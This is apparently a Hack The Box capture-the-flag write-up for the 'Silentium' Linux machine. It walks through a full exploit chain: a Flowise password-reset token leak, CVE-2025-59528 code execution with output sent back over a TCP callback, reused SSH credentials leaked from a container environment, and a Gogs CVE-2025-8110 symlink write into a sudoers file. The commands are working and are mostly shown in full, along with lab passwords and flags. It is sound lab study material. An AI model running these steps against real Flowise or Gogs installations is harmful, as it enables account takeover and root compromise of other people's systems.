# HTB — Silentium (Linux)

**Result:** user `2ac815cd63eeece64e805ecc8b531c6a` · root `e64094ed1fb950d9bed751b9665e3385`
**Chain:** Flowise password-reset info-leak → CVE-2025-59528 RCE (container) → env-leaked SSH creds (user `ben`) → Gogs (runs as **root**) CVE-2025-8110 symlink file-write → `/etc/sudoers.d/ben` → root.

> Lab access: HTB VPN lives on the Kali box (`ssh hsm-kali` → kali@10.2.10.65, tun0 = 10.10.16.192).
> Windows can't reach the target directly — **pivot every target command through Kali**
> (`python3 /tmp/ssh_cmd.py <target> ben '<pw>' "<cmd>"`). Wrap output in `tr -cd '\11\12\15\40-\176'`
> and set `PYTHONIOENCODING=utf-8` to dodge Windows cp1252 `UnicodeEncodeError`.

---

## Recon

Two nginx vhosts (add to `/etc/hosts`):
- `staging.silentium.htb` → **Flowise 3.0.5** (host:3000 → container 172.18.0.2)
- `staging-v2-code.dev.silentium.htb` → **Gogs 0.13.3** (host:3001, binds 127.0.0.1 only)

Host services: Gogs `127.0.0.1:3001` (**runs as root**), Flowise container, MailHog `127.0.0.1:1025/8025`, SSH `0.0.0.0:22`.

---

## Foothold — Flowise admin takeover + RCE

**1. Password-reset info leak.** `forgot-password` echoes the full user record *including the reset `tempToken`* — no MailHog needed (MailHog only matters if you want the email; the reset mail you see there is Flowise's, not Gogs').

```bash
# body MUST be wrapped in {"user":{...}}  (flat {"email":...} 500s)
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H 'Content-Type: application/json' -d '{"user":{"email":"ben@silentium.htb"}}'
# -> 201 {"user":{...,"tempToken":"<TOKEN>","tokenExpiry":"..."}}

curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H 'Content-Type: application/json' \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"<TOKEN>","password":"Flow1seAdm!n2026"}}'
```

**2. Log in — use `/api/v1/auth/login`, NOT `/api/v1/account/basic-auth`.**
`basic-auth` is the legacy app-gate (always "Authentication failed"). The real session
(passport localStrategy → JWT cookies `token`/`refreshToken`/`connect.sid`) comes from `auth/login`:

```bash
curl -s -c jar -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"ben@silentium.htb","password":"Flow1seAdm!n2026"}'
```

**3. CVE-2025-59528 — CustomMCP RCE.** `mcpServerConfig` reaches `Function('return '+input)()`.
Needs the session cookie + header `x-request-from: internal` on
`POST /api/v1/node-load-method/customMCP`. Output is swallowed by try/catch, so exfil over
a TCP callback to the listener. Use `skills/scripts/flowise_cve_2025_59528.py`
(`/tmp/flowise_rce.py` on Kali):

```bash
python3 flowise_cve_2025_59528.py http://staging.silentium.htb jar 10.10.16.192 9001 'id'
# -> uid=0(root)  ... but this is CONTAINER root, not host root.
```

---

## User — ben

Container `/proc/1/environ` leaks creds; **`SMTP_PASSWORD` is reused as ben's SSH password**:

```
FLOWISE_USERNAME=ben  FLOWISE_PASSWORD=F1l3_d0ck3r   # app-gate, NOT the account pw
SMTP_PASSWORD=r04D!!_R4ge                            # == ben's SSH password
JWT_AUTH_TOKEN_SECRET=AABBCCDD...                    # weak, but not needed
```

```bash
ssh ben@silentium.htb        # r04D!!_R4ge   -> user.txt
```

---

## Root — Gogs CVE-2025-8110 (symlink arbitrary file write)

Gogs **runs as root** (`ps`: `root … /opt/gogs/gogs/gogs web`; `app.ini RUN_USER=root`).
A *normal* Gogs user can write any file as root via the contents API following a symlink —
**no admin, no git hooks, no captcha-protected re-registration needed** (the `hacker:Hacker123!`
account already exists from prior runs; otherwise register once — captcha applies).

Do this from **ben's shell on the host** (Gogs is 127.0.0.1:3001; git is installed; Gogs SSH is
disabled so push over HTTP with a token):

```bash
B=http://127.0.0.1:3001; U=hacker
# token via basic-auth (also confirms the password):
TOK=$(curl -s -u 'hacker:Hacker123!' -H 'Content-Type: application/json' \
      -X POST $B/api/v1/users/hacker/tokens -d '{"name":"pwn"}' | grep -oE '"sha1":"[a-f0-9]+"' | cut -d'"' -f4)

# create repo  ***auto_init:true 500s — omit it, push an initial commit yourself***
R=x$RANDOM
curl -s -H "Authorization: token $TOK" -H 'Content-Type: application/json' \
     -X POST $B/api/v1/user/repos -d "{\"name\":\"$R\"}"

# push a symlink pointing at the target file
cd /tmp; git clone http://$U:$TOK@127.0.0.1:3001/$U/$R.git r; cd r
git config user.email a@a.a; git config user.name a
ln -s /etc/sudoers.d/ben malicious_link
git add -A; git commit -m x; git push origin master

# grab the symlink blob sha, then PUT new content -> Gogs writes THROUGH the symlink as root
SHA=$(curl -s -H "Authorization: token $TOK" $B/api/v1/repos/$U/$R/contents/malicious_link | grep -oE '"sha":"[a-f0-9]+"' | head -1 | cut -d'"' -f4)
C=$(printf 'ben ALL=(ALL) NOPASSWD: ALL\n' | base64 -w0)   # trailing newline is required
curl -s -H "Authorization: token $TOK" -H 'Content-Type: application/json' -X PUT \
     $B/api/v1/repos/$U/$R/contents/malicious_link \
     -d "{\"message\":\"u\",\"content\":\"$C\",\"sha\":\"$SHA\",\"branch\":\"master\"}"

sudo -n cat /root/root.txt
```

Automated end-to-end: `skills/scripts/` → see `_gogs_*` helpers + the `pwn2.sh` flow above.

---

## Dead ends — don't repeat these (cost hours)

- **Flowise container escape is impossible.** Standard locked-down Docker: no `CAP_SYS_ADMIN`
  (`CapEff=00000000a00425fb`), no `docker.sock`, no host block device in `/dev` (so no raw
  `/dev/sda4` read), `/root/.flowise` bind-mount only — and that DB is **empty** (one user, no
  credentials/variables/flows). Container root buys nothing beyond the env leak. Stop there.
- **Don't crack the Flowise bcrypt** (`$2a$05$…`). It's the admin's Flowise pw, ~666 H/s on
  Kali CPU (≈6 h for rockyou), and **not reused** for ben SSH / Gogs / root. Just reset it.
- **Gogs has no email** (`[email] ENABLED=false`) → no Gogs password reset. Gogs login as `ben`
  fails on all common pws; the DB (`/opt/gogs/data/gogs.db`) is root-only. Don't go down the
  Gogs-admin / DB-read / hash-crack road — the symlink CVE needs only a normal user.
- The `.gnupg`, repeated `…/udp/1.1.1.1/53` DNS-probe procs, and active Gogs session dirs on the
  host are **our own linpeas/tooling artifacts**, not box automation. No cron/bot to abuse.
- linpeas RED kernel CVEs (2026-43284 xfrm, 2026-43500 rxrpc, 2026-31431) are noise here — the
  intended root is the Gogs symlink write.

## Why it works (one-liner)
Gogs `update-file-contents` API writes the new blob by following the on-disk symlink instead of
treating it as a regular tracked file; because Gogs runs as root, you get arbitrary root file
write → drop a `NOPASSWD` sudoers rule for your shell user.
